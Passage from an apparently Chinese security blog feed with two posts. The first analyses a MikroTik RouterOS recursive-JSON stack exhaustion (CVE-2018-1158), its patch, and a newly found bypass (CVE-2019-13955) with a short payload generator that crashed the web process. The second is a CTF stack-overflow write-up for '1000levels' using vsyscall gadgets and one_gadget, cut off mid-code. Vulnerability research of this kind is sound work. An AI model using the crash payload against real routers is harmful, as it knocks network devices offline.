&lt;path&gt;&#x2F;mikrotik-6.40.5&#x2F;_system-6.40.5.npk.extracted&#x2F;squashfs-root&#x2F;lib&#x2F;libpthread.so.0</span><br><span class="line">#1  0x77573cc3 in malloc () from &lt;path&gt;&#x2F;mikrotik-6.40.5&#x2F;_system-6.40.5.npk.extracted&#x2F;squashfs-root&#x2F;lib&#x2F;libc.so.0</span><br><span class="line">#2  0x775a5c3e in string::reserve(unsigned int) () from &lt;path&gt;&#x2F;mikrotik-6.40.5&#x2F;_system-6.40.5.npk.extracted&#x2F;squashfs-root&#x2F;lib&#x2F;libuc++.so</span><br><span class="line">#3  0x775a5ecd in string::assign(char const*, char const*) () from &lt;path&gt;&#x2F;mikrotik-6.40.5&#x2F;_system-6.40.5.npk.extracted&#x2F;squashfs-root&#x2F;lib&#x2F;libuc++.so</span><br><span class="line">#4  0x775a5f1d in string::assign(string const&amp;) () from &lt;path&gt;&#x2F;mikrotik-6.40.5&#x2F;_system-6.40.5.npk.extracted&#x2F;squashfs-root&#x2F;lib&#x2F;libuc++.so</span><br><span class="line">#5  0x77788942 in void nv::message::insert&lt;nv::string_id&gt;(nv::string_id, nv::IdTraits&lt;nv::string_id&gt;::set_type) () from &lt;path&gt;&#x2F;mikrotik-6.40.5&#x2F;_system-6.40.5.npk.extracted&#x2F;squashfs-root&#x2F;lib&#x2F;libumsg.so</span><br><span class="line">#6  0x77504b63 in ?? () from &lt;path&gt;&#x2F;mikrotik-6.40.5&#x2F;_system-6.40.5.npk.extracted&#x2F;squashfs-root&#x2F;nova&#x2F;lib&#x2F;www&#x2F;jsproxy.p</span><br><span class="line"># ...</span><br><span class="line">#1102 0x77504bd3 in ?? () from &lt;path&gt;&#x2F;mikrotik-6.40.5&#x2F;_system-6.40.5.npk.extracted&#x2F;squashfs-root&#x2F;nova&#x2F;lib&#x2F;www&#x2F;jsproxy.p</span><br><span class="line"># ...</span><br></pre></td></tr></table></figure><blockquote><p>为了便于分析，临时关闭了系统的<code>ASLR</code>机制.</p></blockquote><p>查看栈回溯信息，可以看到存在大量与<code>0x77504bd3 in ?? () from .../jsproxy.p</code>相关的栈帧信息，与漏洞描述中的”递归解析”一致。根据<code>PoC</code>中数据内容格式<code>&quot;&#123;m01: &#123;m01: ... &#125;&#125;&quot;</code>，结合单步调试，定位漏洞触发的地方在<code>sub_77504904()</code>函数中，其被<code>json2message()</code>函数调用，核心代码片段如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">sub_77504904()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">switch</span> ( (_BYTE)a3 )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">            v9 = v6;</span><br><span class="line">            v10 = strtoul(nptr, &amp;nptr, <span class="number">0</span>);</span><br><span class="line">            nv::message::insert&lt;nv::bool_id&gt;(v58, v59, v10 != <span class="number">0</span>, v9);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;m&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> ( v55 != <span class="string">&#x27;&#123;&#x27;</span> )</span><br><span class="line">                <span class="keyword">return</span> v3;</span><br><span class="line">            ++nptr;</span><br><span class="line">            nv::message::message((nv::message *)&amp;v63);</span><br><span class="line">            v17 = sub_77D61904(nptr, (<span class="keyword">int</span>)&amp;v63, v16);<span class="comment">// !!!递归调用</span></span><br><span class="line">            v3 = v17;</span><br><span class="line">            nptr = v17;</span><br><span class="line">            <span class="keyword">if</span> ( *v17 != <span class="string">&#x27;&#125;&#x27;</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                nv::message::~message((nv::message *)&amp;v63);</span><br><span class="line">                <span class="keyword">return</span> v3;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> ( v55 != <span class="string">&#x27;[&#x27;</span> )</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以<code>&quot;&#123;m01: &#123;m01:&#123;m01: &quot; &quot;&#125;&#125;&#125;&quot;</code>为例，其主要处理逻辑为：先解析前面的<code>&quot;&#123;m01: &quot;</code>，执行到<code>switch</code>语句时，匹配<code>&quot;case &#39;m&#39;&quot;</code>分支，然后再次调用<code>sub_77504904()</code>函数，此时数据变为<code>&quot;&#123;m01: &#123;m01: &quot;&quot; &#125;&#125;&quot;</code>，处理逻辑和之前相同。因此，只需要发送的数据包中包含足够多的重复模式，在解析该数据时会造成函数的递归调用，从而不断开辟栈帧,，最终导致<code>&quot;stack exhaustion&quot;</code>。</p><h3 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h3><p>版本<code>6.42.11</code>中修复了该漏洞，基于前面对漏洞形成原因的分析，在程序<code>jsproxy.p</code>中定位漏洞触发的代码片段，如下。可以看到，该代码片段的处理逻辑与之前类似，但在调用函数<code>sub_7750DCFC()</code>时多了一个参数，用来限制递归的深度。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">sub_7750DCFC()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="keyword">switch</span> ( (_BYTE)a3 )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">            v9 = v6;</span><br><span class="line">            v10 = strtoul(nptr, &amp;nptr, <span class="number">0</span>);</span><br><span class="line">            nv::message::insert&lt;nv::bool_id&gt;(v62, v63, v10 != <span class="number">0</span>, v9);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;m&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> ( a4 &gt; <span class="number">0xA</span> || v59 != <span class="string">&#x27;&#123;&#x27;</span> )       <span class="comment">// a4:限制递归深度</span></span><br><span class="line">                <span class="keyword">return</span> v4;</span><br><span class="line">            ++nptr;</span><br><span class="line">            nv::message::message((nv::message *)&amp;v67);</span><br><span class="line">            v18 = sub_7750DCFC(nptr, (<span class="keyword">int</span>)&amp;v67, v17, a4 + <span class="number">1</span>); <span class="comment">// !!!递归调用</span></span><br><span class="line">            v4 = v18;</span><br><span class="line">            nptr = v18;</span><br><span class="line">            <span class="keyword">if</span> ( *v18 != <span class="number">125</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                nv::message::~message((nv::message *)&amp;v67);</span><br><span class="line">                <span class="keyword">return</span> v4;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="未知漏洞发现"><a href="#未知漏洞发现" class="headerlink" title="未知漏洞发现"></a>未知漏洞发现</h3><p>在对补丁进行分析时，通过<code>IDA</code>的交叉引用功能，发现该函数还存在另一处递归调用，如下。</p><img data-src="images/function_xref.png"><p>调用处的部分代码片段如下。可以看到，在处理对应的消息类型<code>M</code>时，也会调用<code>sub_7750DCFC()</code>函数自身，但是却没有对递归调用深度的限制，因此猜测这个地方很可能存在问题。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">sub_7750DCFC()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"><span class="keyword">if</span> ( (_BYTE)a3 == <span class="string">&#x27;M&#x27;</span> )    <span class="comment">// 消息类型M</span></span><br><span class="line">    &#123;</span><br><span class="line">      if ( v59 != &#x27;[]&#x27; )</span><br><span class="line">        <span class="keyword">return</span> v4;</span><br><span class="line">      vector_base::vector_base((vector_base *)&amp;v69);</span><br><span class="line">      ++nptr;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = nptr;</span><br><span class="line">        v52 = *nptr;</span><br><span class="line">        <span class="keyword">if</span> ( *nptr == <span class="string">&#x27;]&#x27;</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !v52 )</span><br><span class="line">          <span class="keyword">goto</span> LABEL_151;</span><br><span class="line">        <span class="keyword">if</span> ( v52 == <span class="string">&#x27; &#x27;</span> || v52 == <span class="string">&#x27;,&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          ++nptr;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          nv::message::message((nv::message *)&amp;v65);</span><br><span class="line">          v54 = sub_7750DCFC(nptr, (<span class="keyword">int</span>)&amp;v65, v53, a4 + <span class="number">1</span>);  <span class="comment">// !!!递归调用，没有对a4进行判断</span></span><br><span class="line">          v4 = v54;</span><br><span class="line">          nptr = v54;</span><br><span class="line">          <span class="keyword">if</span> ( *v54 != <span class="string">&#x27;&#125;&#x27;</span> )</span><br><span class="line">          &#123;</span><br><span class="line">              <span class="comment">// ...</span></span><br><span class="line">       <span class="comment">// ....</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>根据<code>Jacob Baines</code>议题<code>《Bug Hunting in RouterOS》</code>中对<code>json</code>消息格式的介绍，消息类型<code>M</code>与消息类型<code>m</code>对应，<code>m</code>表示单个<code>Message</code>，而<code>M</code>表示<code>&quot;Message array&quot;</code>。</p><img data-src="images/json_protocol_description.png" style="zoom:80%"><blockquote><p>图片来源：<code>Jacob Baines</code>议题《<code>Bug Hunting in RouterOS</code>》</p></blockquote><p>通过构造一个简短的<code>payload</code>: <code>&quot;&#123;M01:[M01:[M01:[]]]&#125;&quot;</code>，然后利用<code>gdb</code>进行调试，发现确实可以到达对应的函数调用点，该函数会递归调用自身来对数据进行解析，与之前对消息类型<code>m</code>的处理逻辑相似。接着，利用一个简单的脚本来产生大量包含这种模式的数据，然后修改<code>CVE-2018-1158</code> <code>PoC</code>中对应的数据，在版本为<code>6.42.11</code>的设备上进行验证，可以看到进程<code>www</code>确实崩溃了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msg = <span class="string">&quot;&#123;M01:[M01:[]]&#125;&quot;</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">2000</span>):</span><br><span class="line">msg = msg.replace(<span class="string">&#x27;[]&#x27;</span>, <span class="string">&quot;[M01:[]]&quot;</span>)</span><br></pre></td></tr></table></figure><p>通过代码静态分析，该未知漏洞在<code>&quot;Long-term&quot;</code>最新版本<code>6.43.16</code>上仍然存在。</p><blockquote><p>该漏洞(<code>CVE-2019-13955</code>)目前已被修复，建议及时升级到最新版本。</p></blockquote><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><ul><li>该漏洞触发的原因为：程序在对某些特殊构造的数据进行解析时存在递归调用，从而造成<code>&quot;stack exhaustion&quot;</code>；</li><li>对该漏洞的修复主要是在递归调用函数时增加了一个参数，用来限制递归调用的深度；</li><li>对该漏洞进行修复时未考虑全面，仅对消息类型为<code>m</code>的数据增加了递归调用深度的判断，而通过构造消息类型为<code>M</code>的数据仍可触发该漏洞。</li></ul><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cudGVuYWJsZS5jb20vc2VjdXJpdHkvcmVzZWFyY2gvdHJhLTIwMTgtMjE=">Mikrotik RouterOS Multiple Authenticated Vulnerabilities<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3RlbmFibGUvcm91dGVyb3M=">RouterOS Bug Hunting Materials<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9tZWRpdW0uY29tL3RlbmFibGUtdGVjaGJsb2cvbWFrZS1pdC1yYWluLXdpdGgtbWlrcm90aWstYzkwNzA1NDU5YmM2">Make It Rain with MikroTik<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9tZWRpdW0uY29tL0BtYXhpLi9maW5kaW5nLWFuZC1leHBsb2l0aW5nLWN2ZS0yMDE4LTc0NDUtZjMxMDNmMTYzY2Mx">Finding and exploiting CVE-2018–7445<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9zZWNsaXN0cy5vcmcvZnVsbGRpc2Nsb3N1cmUvMjAxOS9KdWwvMjA=">Two vulnerabilities found in MikroTik’s RouterOS<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9taWtyb3Rpay5jb20vZG93bmxvYWQvY2hhbmdlbG9ncy9sb25nLXRlcm0tcmVsZWFzZS10cmVl">Mikrotik RouterOS Changelogs<i class="fa fa-external-link-alt"></i></span></li></ul><br /><blockquote><p>本文首发于安全客，文章链接：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMTgzNDUx">https://www.anquanke.com/post/id/183451<i class="fa fa-external-link-alt"></i></span></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mikrotik </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>htib2017 pwn 之 1000levels</title>
      <link href="2019/05/12/htib2017-pwn-%E4%B9%8B-1000levels/"/>
      <url>2019/05/12/htib2017-pwn-%E4%B9%8B-1000levels/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近在安全客上看到一篇文章<span class="exturl" data-url="aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMTc3NTIw">PIE保护详解和常用bypass手段<i class="fa fa-external-link-alt"></i></span>，里面提到了3种绕过PIE保护机制的方式：<code>partial write</code>、<code>泄露地址</code>和<code>vdso/vsyscall</code>。由于之前对<code>vdso/vsyscall</code>机制了解的不多，于是花了点时间动手实践，以下是对题目<code>1000levels</code>的简单分析。</p><h3 id="1000levels"><a href="#1000levels" class="headerlink" title="1000levels"></a>1000levels</h3><h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><p>该程序提供的功能如下。</p><a id="more"></a><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> ./1000levels</span></span><br><span class="line">Welcome to 1000levels, it&#x27;s much more diffcult than before.</span><br><span class="line">1. Go</span><br><span class="line">2. Hint</span><br><span class="line">3. Give up</span><br><span class="line">Choice:</span><br></pre></td></tr></table></figure><p>利用<code>IDA</code>加载程序，通过分析，程序的功能和逻辑很简单，漏洞也很明显：在<code>level()</code>函数中存在一个栈溢出漏洞。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000ED4 lea     rdi, aQuestionDDAnsw ; &quot;Question: %d * %d &#x3D; ? Answer:&quot;</span><br><span class="line">.text:0000000000000EDB mov     eax, 0</span><br><span class="line">.text:0000000000000EE0 call    _printf</span><br><span class="line">.text:0000000000000EE5 lea     rax, [rbp+buf]</span><br><span class="line">.text:0000000000000EE9 mov     edx, 400h       ; nbytes</span><br><span class="line">.text:0000000000000EEE mov     rsi, rax        ; buf</span><br><span class="line">.text:0000000000000EF1 mov     edi, 0          ; fd</span><br><span class="line">.text:0000000000000EF6 call    _read           ; stack overflow</span><br><span class="line">.text:0000000000000EFB mov     [rbp+var_4], eax</span><br></pre></td></tr></table></figure><p>查看一下程序开启的保护措施，可以看到启用了<code>NX</code>和<code>PIE</code>。因此可以通过栈溢出来覆盖返回地址，但问题是用什么来覆盖返回地址。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">gdb-peda$</span><span class="bash"> checksec</span> </span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : ENABLED</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure><p>在<code>hint()</code>函数中，将<code>system()</code>函数的地址保存在了栈上，但是没办法进行泄露，在程序的其他部分也没发现存在信息泄露的可能。</p><h4 id="vsyscall-vdso"><a href="#vsyscall-vdso" class="headerlink" title="vsyscall/vdso"></a><code>vsyscall/vdso</code></h4><p><code>vsyscall</code>/<code>vdso</code>是用于加速某些系统调用的两种机制。</p><p>由于在进行系统调用时，操作系统需要在用户态和内核态间进行切换，传统的<code>int 0x80/iret</code>中断有点慢，<code>Intel</code>和<code>AMD</code>分别实现了<code>sysenter/sysexit</code>和<code>syscall/sysret</code>，即所谓的快速系统调用指令，使用它们更快，但同时也带了兼容性的问题。于是<code>Linux</code>实现了<code>vsyscall</code>，程序统一调用<code>vsyscall</code>，具体的选择由内核来决定。</p><p><code>vsyscall</code>用来执行特定的系统调用，减少系统调用的开销。某些系统调用并不会向内核提交参数，而仅仅是向内核请求某个数据，比如<code>gettimeofday()</code>，内核在处理这部分系统调用时可以把系统当前时间写在一个固定的位置，然后通过<code>mmap()</code>映射到用户空间，应用程序直接从该位置读取即可。(内核与用户态程序之间通过<code>mmap()</code>进行数据)。</p><p>但是由于<code>vsyscall</code>采用固定地址映射的方式，存在一定的安全隐患，这一方式被<code>vdso</code>所改进，其随机映射在一定程度上缓解了安全威胁。但考虑到兼容性问题(针对一些比较老的应用程序)，<code>vsyscall</code>和<code>vdso</code>这两种方式可能会同时存在。</p><blockquote><p><code>vdso</code>全称为<code>Virtual Dynamic Shared Object</code>，可以将其看成是一个虚拟的so文件，由内核提供，但这个so文件不在磁盘上，而是在内核里。内核将包含某个.so的内存页在程序启动时映射到其内存空间，对应的程序就可以当普通的.so来使用其中的函数。比如<code>syscall()</code>函数就是在<code>linux-vdso.so.1</code>里面，但是磁盘上并没有对应的文件。</p></blockquote><p><code>vsyscall</code>和<code>vdso</code>的对比如下:</p><ul><li><code>vsyscall</code>方式分配的内存较小，只允许4个系统调用，同时<code>vsyscall</code>页面是静态分配的，地址是固定的；</li><li><code>vdso</code>提供与<code>vsyscall</code>相同的功能，同时解决了其局限。<code>vdso</code>是<code>glibc</code>库提供的功能，其页面是动态分配的，地址是随机的，可以提供超过4个系统调用。</li></ul><p>在<code>gdb</code>中将<code>vsyscall</code>所在页面的内容<code>dump</code>下来，在<code>IDA</code>中进行查看如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">seg000:0000000000000000 seg000      segment byte public &#39;CODE&#39; use64</span><br><span class="line">seg000:0000000000000000             assume cs:seg000</span><br><span class="line">seg000:0000000000000000             assume es:nothing, ss:nothing, ds:nothing, fs:nothing, gs:nothing</span><br><span class="line">seg000:0000000000000000             mov     rax, 60h</span><br><span class="line">seg000:0000000000000007             syscall                 ; Low latency system call</span><br><span class="line">seg000:0000000000000009             retn</span><br><span class="line">seg000:0000000000000009 ; ---------------------------------------------------------------------------</span><br><span class="line">seg000:000000000000000A             align 400h</span><br><span class="line">seg000:0000000000000400             mov     rax, 0C9h</span><br><span class="line">seg000:0000000000000407             syscall                 ; Low latency system call</span><br><span class="line">seg000:0000000000000409             retn</span><br><span class="line">seg000:0000000000000409 ; ---------------------------------------------------------------------------</span><br><span class="line">seg000:000000000000040A             align 400h</span><br><span class="line">seg000:0000000000000800             mov     rax, 135h</span><br><span class="line">seg000:0000000000000807             syscall                 ; Low latency system call</span><br><span class="line">seg000:0000000000000809             retn</span><br><span class="line">seg000:0000000000000809 ; ---------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><p>可以看到其中包含3个系统调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_gettimeofday 96<span class="comment">//0x60</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_time 201   <span class="comment">//0xc9</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __NR_getcpu 309 <span class="comment">//0x135</span></span></span><br></pre></td></tr></table></figure><p>前面提到过，<code>vsyscall</code>页面的地址是固定的，这意味着在这个区域有3个可用的<code>gadgets</code>。</p><blockquote><p>当直接调用<code>vsyscall</code>中的<code>syscall</code>时，会提示段错误，因为<code>vsyscall</code>执行时会检查是否从函数开头开始执行，所以可以直接利用的地址是从<code>vsyscall</code>起始偏移为<code>0x0</code>、<code>0x400</code>和<code>0x800</code>的地址。</p></blockquote><h4 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h4><p>在调用<code>hint()</code>函数时，将<code>system()</code>函数的地址保存在了栈上。而在调用<code>go()</code>函数时，<code>system()</code>函数的地址仍然在栈中，因此可通过控制函数流程<code>main()-&gt;hint()-&gt;main()-&gt;go()-&gt;level()</code>，结合<code>vsyscall</code>中的<code>gadgets</code>，实现将控制流劫持到栈上保存的<code>system()</code>函数地址处。</p><p>在执行<code>main()-&gt;hint()-&gt;main()-&gt;go()-&gt;level()</code>时，栈帧的变化如下。</p><img data-src="images/hint_stackframe.png"><img data-src="images/go_level_stackframe.png"><p>由上图可知，在执行<code>go()</code>函数前，<code>system()</code>函数的地址仍在栈上。但是在go()函数内，其局部变量<code>v5/v6</code>所在的内存空间地址与保存<code>system_ptr</code>的地址相同，因此需要确保该地址出的内容不能被覆盖。之后，<code>go()</code>函数调用<code>level()</code>函数，由于溢出发生在<code>level()</code>函数中，通过控制栈布局并覆盖返回地址，可劫持控制流，从而执行<code>system()</code>函数。</p><p>大体的思路如上，但其中还有一些细节需要处理：</p><ol><li><p>如何确保<code>system_ptr</code>不被覆盖? 由下面的代码可知，保证<code>v2&lt;=0</code>和<code>v3=0</code>即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v2 &gt; <span class="number">0</span> )</span><br><span class="line">    v5 = v2;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Coward&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Any more?&quot;</span>);</span><br><span class="line">v3 = read_num();</span><br><span class="line">v6 = v5 + v3;</span><br></pre></td></tr></table></figure></li><li><p>将控制流劫持到<code>system()</code>函数时，无法控制其参数。<code>system()</code>函数的第一个参数保存在<code>$rdi</code>寄存器中，但在执行<code>strtol()</code>函数后，<code>$rdi</code>寄存器的内容会改变，暂时没有其他方式来控制<code>$rdi</code>寄存器的内容。<br>在这种情况下，<code>one_gadget</code>就派上用场了。<code>one_gadget</code>是<code>glibc</code>里调用<code>execve(&#39;/bin/sh&#39;, NULL, NULL)</code>的一段非常有用的<code>gadget</code>，在能够控制<code>eip/rip</code>的时候，用<code>one_gadget</code>来做实现<code>RCE</code>非常方便。利用工具<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2RhdmlkOTQyai9vbmVfZ2FkZ2V0">one_gadget<i class="fa fa-external-link-alt"></i></span>在<code>libc</code>中进行查找，如下。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> one_gadget ./libc.so</span> </span><br><span class="line">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf0274 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1117 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure><p>现在栈上保存的是<code>system()</code>函数的地址<code>system_ptr</code>，由于<code>system</code>和<code>one_gadget</code>在<code>libc</code>中的偏移是固定的，因此只需要对<code>system_ptr</code>进行加/减操作，即可计算出<code>one_gadget</code>的运行时地址，而程序正好提供了这个功能。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v2 &gt; <span class="number">0</span> )</span><br><span class="line">    v5 = v2;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Coward&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Any more?&quot;</span>);</span><br><span class="line">v3 = read_num();</span><br><span class="line">v6 = v5 + v3;</span><br></pre></td></tr></table></figure><p>由于保存变量<code>v5</code>的地址与保存<code>system_ptr</code>的地址相同，因此只需要控制变量<code>v3</code>的值即可。</p></li><li><p>由于计算得到的<code>one_gadget</code>的地址(也就是变量<code>v6</code>的值)大于1000，<code>level()</code>函数会递归调用多次，因此需要答对所有题目，然后在最后一次进行溢出。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v6 &lt;= <span 